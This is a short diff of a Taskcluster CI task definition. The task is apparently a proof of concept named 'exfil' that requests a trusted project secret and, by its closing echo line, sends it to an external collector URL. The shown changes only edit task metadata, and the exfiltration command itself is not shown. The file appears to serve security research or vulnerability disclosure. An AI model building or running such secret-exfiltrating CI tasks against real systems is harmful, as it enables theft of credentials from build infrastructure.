@@ -10,8 +10,9 @@ tasks:
       taskId: {$eval: as_slugid("exfil")}
       created: {$fromNow: ''}
       taskQueueId: docker-compose/generic-worker
-      schedulerId: taskcluster-ui
       deadline: {$fromNow: '30 minutes'}
+      projectId: none
+      tags: none
 
       scopes:
         - secrets:get:project/poc/trusted-secret
@@ -26,7 +27,6 @@ tasks:
 
       payload:
         maxRunTime: 600
-        image: ubuntu:22.04
         command:
           - /bin/bash
           - -c
@@ -46,3 +46,5 @@ tasks:
             echo "=========================================="
             echo "PoC complete. Check $COLLECTOR_URL for the exfiltrated secret."
             echo "=========================================="
+      extra: {}
+      dependencies: []
